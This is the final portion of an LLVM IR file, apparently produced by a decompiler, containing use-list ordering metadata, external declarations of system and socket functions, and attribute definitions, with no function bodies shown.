219, 1564, 336, 218, 1565, 117, 1566, 1567, 254, 38, 1568, 1273, 1274, 1275, 39, 1778, 1779, 118, 220, 1569, 1570, 1571, 1572, 1573, 221, 1192, 965, 1193, 144, 159, 1179, 1180, 1187, 1184, 1185, 1186, 255, 1188, 296, 1182, 1181, 256, 1183, 1019, 1020, 1194, 1195, 1021, 1022, 1574, 1575, 1576, 1577, 1578, 160, 1579, 1580, 1581, 1582, 1583, 222, 1584, 1586, 1587, 1585, 1588, 161, 1589, 1590, 223, 1591, 224, 274, 337, 1592, 1593, 225, 226, 1594, 1595, 1596, 1597, 1598, 1599, 287, 1600, 1601, 338, 1602, 288, 1604, 231, 1606, 228, 229, 1603, 227, 1605, 1607, 1609, 163, 1610, 1611, 232, 102, 103, 1612, 1613, 162, 339, 1614, 1615, 233, 340, 1616, 1617, 230, 1618, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 1626, 1627, 341, 1629, 138, 108, 1628, 1630, 1631, 1632, 40, 970, 234, 971, 143, 104, 121, 1608, 257, 999, 41, 259, 235, 1001, 1000, 258, 289, 1774, 1198, 1199, 1200, 105, 1201, 1202, 236, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 173, 1633, 1216, 1159, 1160, 1161, 1162, 1163, 1164, 966, 1634, 1075, 1080, 1661, 1773, 1023, 1662, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1087, 1237, 42, 1431, 164, 1432, 1433, 243, 242, 967, 139, 140, 141, 142, 969, 968, 78, 77, 165, 1434, 1435, 1436, 1437, 1439, 1438, 342, 347, 1035, 1036, 1037, 79, 119, 80, 81, 82, 260, 348, 1038, 83, 109, 345, 346, 84, 110, 349, 350, 344, 261, 351, 343, 352, 1039, 1040, 1041, 1043, 268, 1042, 1044, 1045, 355, 356, 353, 354, 1046, 361, 357, 358, 359, 1048, 360, 362, 1049, 1050, 1051, 363, 1052, 364, 365, 166, 167, 1053, 85, 265, 264, 1054, 1055, 86, 263, 262, 1056, 87, 88, 89, 90, 91, 92, 93, 366, 1057, 367, 370, 1058, 368, 369, 1059, 371, 290, 372, 1061, 291, 373, 1062, 1064, 94, 111, 1063, 292, 375, 376, 374, 377, 1076, 237, 379, 380, 381, 1081, 382, 1082, 383, 384, 378, 266, 385, 1083, 386, 95, 112, 96, 1086, 387, 238, 97, 1088, 388, 1283, 1635, 1636, 297, 1637, 1638, 267, 1660, 972, 973, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 1780, 1781, 1782, 1783, 1784, 1785, 1786, 1787, 1788, 1789, 1790, 1791, 1792, 1793, 1794 }
  uselistorder i32* @r4, { 54, 567, 390, 10, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 55, 56, 401, 57, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 188, 5, 189, 190, 4, 191, 192, 193, 12, 194, 11, 195, 196, 197, 198, 199, 200, 203, 206, 207, 208, 209, 210, 201, 202, 204, 205, 13, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 226, 225, 227, 228, 229, 230, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 14, 16, 71, 15, 72, 75, 73, 74, 231, 232, 233, 234, 2, 235, 236, 237, 238, 239, 240, 241, 244, 242, 243, 42, 245, 246, 247, 248, 249, 414, 415, 416, 250, 251, 17, 252, 253, 254, 255, 256, 257, 18, 258, 259, 260, 261, 262, 263, 264, 417, 418, 265, 266, 267, 268, 269, 270, 271, 272, 273, 419, 420, 421, 422, 274, 275, 541, 542, 543, 544, 545, 546, 571, 574, 575, 286, 285, 288, 287, 7, 290, 289, 291, 6, 332, 333, 334, 335, 336, 337, 19, 338, 339, 342, 343, 350, 351, 352, 355, 364, 365, 366, 367, 98, 99, 100, 101, 102, 103, 423, 424, 425, 426, 427, 428, 429, 576, 577, 430, 431, 432, 433, 434, 435, 436, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 292, 293, 294, 295, 296, 302, 303, 20, 304, 305, 47, 437, 438, 439, 440, 21, 441, 442, 443, 444, 22, 445, 446, 447, 23, 448, 449, 450, 451, 452, 453, 8, 461, 0, 462, 463, 24, 454, 455, 456, 457, 458, 464, 1, 547, 548, 594, 595, 9, 368, 369, 549, 596, 597, 598, 599, 600, 601, 550, 551, 602, 603, 25, 604, 605, 606, 607, 619, 620, 621, 622, 45, 630, 43, 614, 615, 616, 617, 618, 608, 609, 610, 552, 553, 554, 555, 556, 557, 558, 559, 611, 612, 163, 164, 560, 561, 562, 563, 564, 565, 566, 76, 77, 78, 79, 80, 81, 82, 83, 84, 104, 105, 106, 107, 108, 175, 176, 86, 109, 110, 111, 85, 87, 177, 178, 179, 613, 370, 371, 356, 26, 112, 113, 114, 27, 115, 28, 116, 117, 372, 29, 30, 373, 374, 375, 376, 377, 378, 357, 358, 359, 360, 361, 362, 363, 348, 349, 143, 144, 159, 160, 344, 345, 340, 341, 167, 168, 346, 347, 169, 170, 171, 172, 379, 380, 381, 382, 383, 31, 384, 385, 386, 387, 388, 389, 623, 624, 625, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 306, 307, 308, 309, 310, 311, 312, 313, 297, 298, 299, 300, 301, 118, 32, 119, 120, 314, 33, 315, 316, 121, 122, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 499, 498, 500, 501, 502, 503, 504, 505, 506, 34, 507, 508, 509, 515, 516, 517, 518, 3, 519, 520, 521, 522, 523, 524, 525, 35, 526, 36, 527, 528, 529, 530, 50, 51, 52, 510, 512, 511, 513, 514, 459, 460, 88, 46, 89, 90, 91, 92, 93, 94, 95, 96, 44, 97, 48, 49, 626, 627, 628, 629, 317, 318, 319, 320, 321, 322, 323, 37, 324, 38, 325, 326, 327, 328, 329, 330, 331, 531, 532, 533, 534, 276, 277, 278, 279, 280, 281, 282, 39, 40, 283, 284, 535, 536, 165, 166, 173, 174, 569, 570, 123, 124, 572, 573, 125, 126, 127, 41, 128, 129, 130, 131, 186, 187, 353, 354, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 161, 162, 180, 181, 182, 183, 184, 185, 537, 538, 539, 540, 53, 568 }
}

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
